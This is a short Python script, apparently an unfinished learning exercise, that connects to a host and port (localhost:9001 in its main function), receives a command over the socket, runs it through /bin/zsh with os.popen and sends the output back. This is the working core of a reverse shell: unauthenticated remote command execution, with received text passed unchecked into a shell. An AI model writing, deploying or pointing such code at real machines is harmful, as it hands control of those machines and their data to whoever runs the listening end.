import socket
import os
import subprocess

def client(ip: str, port: int) -> None:
    """

    :param ip:
    :param port:
    :return:
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))
    # this next line sends the message to the client
    #s.send(b"sooooo cool")

    received = s.recv(220)
    # breakpoint()
    print(f"Command recieved: {received}")
    p = os.popen(f"/bin/zsh -c {received.decode()}")
    output = p.read()
    s.send(output.encode())
    # receive the length of data (4Byte integer)







def main() -> None:
    client("localhost", 9001)
    # return 0


if __name__ == '__main__' :
    exit(main())
